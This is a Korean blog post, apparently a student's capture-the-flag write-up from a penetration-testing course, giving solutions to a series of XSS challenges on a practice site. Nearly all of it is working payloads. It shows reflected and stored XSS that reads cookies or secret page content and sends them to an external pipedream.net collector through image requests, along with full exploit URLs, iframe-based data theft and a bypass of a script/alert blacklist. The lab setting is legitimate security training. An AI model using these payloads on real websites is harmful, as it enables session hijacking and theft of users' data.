---
layout: post
comments: true
sitemap:
    changefreq: daily
    priority: 0.5

title: "[CTF] CTF 문제 풀이: XSS"
excerpt: "모의해킹 취업반 스터디 7기 9주차"

date: 2024-12-18
last_modified_at: 

tags: [TIL, WEB]
---

# XSS 1
## index.php

## login.html

## signup.html

### signup.php
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-18-1.png?raw=true)

## qna_board.php

## qna.php
### qna_create.php

## notice_list.php
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-18-2.gif?raw=true)
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-18-3.gif?raw=true)
![alt text](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-18-4.gif?raw=true)

## notice_write.php
### notice_write_process.php

## mypage.php
### mypage_update.php

# xss2
## notice_list.php의 search 부분 -> reflected xss
```js
');
let c = document.cookie;
console.log(c);
let i = new Image();
console.log(i);
i.src = "https://eot2jevtyijbm2l.m.pipedream.net/?cookie=" + c;
alert('
```

link: <http://ctf.segfaulthub.com:4343/xss_2/notice_list.php?option_val=username&board_result=');let+c=document.cookie;console.log(c);let+i=new+Image();console.log(i);i.src="https://eot2jevtyijbm2l.m.pipedream.net/?cookie="%2Bc;let+tmp=('&board_search=%F0%9F%94%8D&date_from=&date_to=>

# xss3
notice_list.php의 search 부분은 html entity로 치환
## mypage -> reflected xss

```html
<img src=. onerror='
let c=document.cookie;
let i=new Image();
i.src="https://eot2jevtyijbm2l.m.pipedream.net/?cookie="+c;'>
```
+ -> %2B

# xss4
## notice_list -> stored xss
script, alert <- black list filtering
`<img src=. onerror="prompt(1)">`

```html
<img src=. onerror="let cookie = document.cookie;let img = new Image();img.src = 'https://eot2jevtyijbm2l.m.pipedream.net/?cookie=' + cookie;">
```

# xss5

# xss6
# login.php
```js
');
let c = document.cookie;
let i = new Image();
i.src = "https://eot2jevtyijbm2l.m.pipedream.net/?cookie="+c;
let tmp = ('
```

link: <http://ctf.segfaulthub.com:4343//xss_7/login.php?id=');let+c=document.cookie;let+i=new+Image();i.src="https://eot2jevtyijbm2l.m.pipedream.net/?cookie="%2Bc;let+tmp=('&pw=>

# Basic Script Prac
## mypage -> reflected xss
<img src=. onerror="
let e = document.querySelectorAll('input')[1].placeholder;
let i = new Image();
i.src = 'https://eot2jevtyijbm2l.m.pipedream.net/?cookie=' + e;
">

# Steal Info
## notice_list -> stored xss
<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac/secret.php" id="targetIframe">
</iframe>
<script>
    let f = document.querySelector('iframe').contentWindow;
    f.addEventListener('load', () => {
        var e = f.document.getElementsByClassName('card-text')[1].textContent;
        console.log(f);
        let i = new Image();
        i.src = "https://eot2jevtyijbm2l.m.pipedream.net/?cookie=" + e;
    })
</script>

# Steal Info 2
## notice_list -> stored xss
<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac2/mypage.php" id="targetIframe">
</iframe>
<script>
    let f = document.querySelector('iframe').contentWindow;
    f.addEventListener('load', () => {
        let e = f.document.querySelectorAll('input')[1].placeholder;
        console.log(f);
        let i = new Image();
        i.src = "https://eot2jevtyijbm2l.m.pipedream.net/?cookie=" + e;
    })
</script>